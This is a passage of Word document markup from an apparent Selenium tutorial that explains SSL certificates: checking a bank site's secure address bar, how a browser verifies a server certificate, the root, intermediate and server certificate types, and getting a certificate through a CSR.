            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Type </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>https://netbanking.hdfcbank.com/netbanking</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> .</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="547" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="548" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Hit Enter.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="549" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="550" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>You will see a green address bar in the browser as below :-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="551" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0D9CD8C2" wp14:editId="553434CF">
            <wp:extent cx="5494020" cy="388620"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="60" name="Picture 60" descr="SSL Certificate Error Handling in Selenium">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SL Certificate Error Handling in Selenium">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4020" cy="388620"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="552" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="553" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>How Does the SSL Certificate Create a Secure Connection</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="554" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4EDADB17" wp14:editId="3D13DECB">
            <wp:extent cx="4450080" cy="3855720"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="59" name="Picture 59" descr="SSL Certificate Error Handling in Selenium">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SL Certificate Error Handling in Selenium">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0080" cy="3855720"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="555" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="556" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Browser</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> sends HTTPS request to the server.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="557" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="558" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Now Server must provide some identification to Browser to prove that it is trusted. This can be done by sending a copy of its SSL certificate to the browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="559" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="560" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Each Browser has its own list of Trusted CA's. </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Browser checks the certificate root against its list of trusted CAs and that the certificate is unexpired, unrevoked, and that the common name is valid for the website that it is connecting to.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="561" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="562" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>If the browser trusts the certificate, an encrypted session is created between the server and the browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="563" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="564" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Server and Browser can send encrypted messages</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="565" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="566" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of SSL Certificates</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="567" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="568" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Browser and the server use SSL Certificate mechanism to be able to establish a secure connection. This connection involves verification of three types of certificates.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="569" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="570" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Root</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="571" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="572" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Intermediate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="573" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="574" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Server Certificate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="575" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="576" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Process of getting SSL Certificate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="577" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="578" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The process of getting SSL certificate includes below steps:-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="579" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="580" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>First, you must create CSR (create a Certificate Signing Request) request.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="581" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="582" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>CSR request creates CSR data file, which is sent to SSL certificate issuer known as CA (Certificate Authority).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="583" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="584" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The CA uses the CSR data files to create SSL certificate for your server.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="585" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="586" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>After receiving the SSL certificate, you have to install it on your server.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="587" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="588" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>An intermediate certificate is also needed to be installed which ties yours SSL certificate with CA's root certificate.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="589" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="590" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The below image represent all the three certificate- </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Root, Intermediate, and Server Certificate.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="591" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3E56D8A1" wp14:editId="24C16BE3">
            <wp:extent cx="4914900" cy="4373880"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="58" name="Picture 58" descr="SSL Certificate Error Handling in Selenium">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SL Certificate Error Handling in Selenium">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14900" cy="4373880"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="592" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="593" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>How SSL certificates are verified</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="594" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="595" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
